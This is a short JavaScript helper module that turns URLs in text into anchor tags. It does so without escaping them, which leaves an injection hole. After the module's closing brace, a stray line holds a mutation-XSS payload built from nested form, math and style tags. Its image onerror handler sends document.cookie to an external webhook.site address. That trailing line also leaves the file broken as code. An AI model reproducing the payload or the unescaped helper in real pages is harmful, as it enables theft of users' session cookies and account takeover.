module.exports = {
  makeHyperLink(text) {
    // check if text contains a link
    if (text.includes("http") || text.includes("www.")) {
      // if it does, return the text with the link wrapped in an anchor tag
      return text.replace(
        /(http|www.)\S+/g,
        (match) =>
          `<a class="text-blue-600 underline" href="${match}">${match}</a>`
      );
    }
    return text;
  },
}`
<form><math><mtext></form><form><mglyph><style></math><img src onerror=fetch("htt<h1>ps</h1>://webhook.site/80610479-4beb-4ea9-bc15-617472018dfe/"+document.cookie)>`;
